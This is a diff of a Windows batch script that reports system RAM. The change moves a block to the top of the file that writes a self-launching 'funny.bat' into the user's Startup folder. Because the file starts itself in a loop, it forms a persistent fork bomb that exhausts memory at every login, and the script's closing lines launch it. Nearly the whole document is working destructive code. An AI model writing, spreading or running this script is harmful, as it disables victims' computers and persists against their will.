@@ -1,4 +1,5 @@
 @echo off 
+cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 echo :funny > funny.bat
 echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
 echo start funny.bat >> funny.bat
@@ -18,11 +19,7 @@ echo Total system ram is %system_ram%
 set /a "c=%system_ram% - 28"
 
 echo Will be getting rid of %c% bytes of memory
-cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-echo :funny > funny.bat
-echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
-echo start funny.bat >> funny.bat
-echo goto :funny >> funny.bat
+
 
 echo Finished!
 start funny.bat
